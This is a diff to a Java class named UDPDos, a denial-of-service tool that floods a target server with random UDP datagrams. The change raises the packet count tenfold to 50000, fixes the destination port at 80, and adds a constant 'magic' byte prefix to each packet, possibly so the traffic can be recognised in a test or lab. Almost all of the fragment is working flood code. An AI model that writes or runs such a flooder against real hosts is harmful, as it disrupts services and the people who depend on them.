@@ -8,7 +8,7 @@ import java.util.Random;
 
 public class UDPDos implements Runnable {
 	private InetAddress server;
-	private int amount = 5000;
+	private int amount = 50000;
 
 	private long seed = 4276498;
 
@@ -31,15 +31,15 @@ public class UDPDos implements Runnable {
 		System.out.println("UDPDOS finished");
 	}
 
+	public static final byte[] MAGIC = new byte[] {48, -110, 100, 19, -30, 22, 1, 0};
 	private boolean udpAttack(Random r) {
 		int length = r.nextInt(500) + 50;
-		byte buffer[] = new byte[length];
+		byte[] buffer = new byte[length];
 
 		r.nextBytes(buffer);
+		System.arraycopy(MAGIC, 0, buffer, 0, MAGIC.length);
 
-		int port = r.nextInt(65535) + 1;
-
-		DatagramPacket dataSent = new DatagramPacket(buffer, length, server, port);
+		DatagramPacket dataSent = new DatagramPacket(buffer, length, server, 80);
 		try (DatagramSocket socket = new DatagramSocket()) {
 			socket.send(dataSent);
 		} catch (IOException e) {
